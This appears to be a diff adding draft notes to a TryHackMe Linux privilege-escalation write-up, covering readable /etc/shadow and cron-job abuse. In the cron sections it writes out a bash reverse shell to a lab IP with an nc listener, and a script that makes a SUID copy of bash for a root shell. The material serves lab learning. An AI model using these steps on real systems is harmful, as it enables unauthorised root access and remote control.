@@ -62,7 +62,7 @@ In this task we utilize insecure read permissions for the /etc/shadow file.
    ls -lh /etc/shadow
    ```
    
-   ![]()
+   ![Shadow Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Readable_Shadow_Permissions.png)
    
    Looks like the file as read and write permissions for all users. We can now view the file.
    
@@ -306,7 +306,50 @@ sudo LD_LIBRARY_PATH=/tmp apache2
 ![]()
 
 ### Cron Jobs - File Permissions
+
+cat /etc/crontab
+locate overwrite.sh
+ls -l /usr/local/bin/overwrite.sh
+nano /usr/local/bin/overwrite.sh
+
+
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+
+nc -nvlp 4444
+
+
+
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Crontab.png
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Job.png
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Locate.png
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Permission.png
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Root_Shell.png
+
+
 ### Cron Jobs - PATH Environment Variable
+
+cat /etc/crontab
+
+
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+
+chmod +x /home/user/overwrite.sh
+
+/tmp/rootbash -p
+
+rm /tmp/rootbash
+exit
+
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Remove.png
+https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Variable.png
+
+
+
+/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
 ### Cron Jobs - Wildcards
 ### SUID / SGID Executables - Known Exploits
 ### SUID / SGID Executables - Shared Object Injection
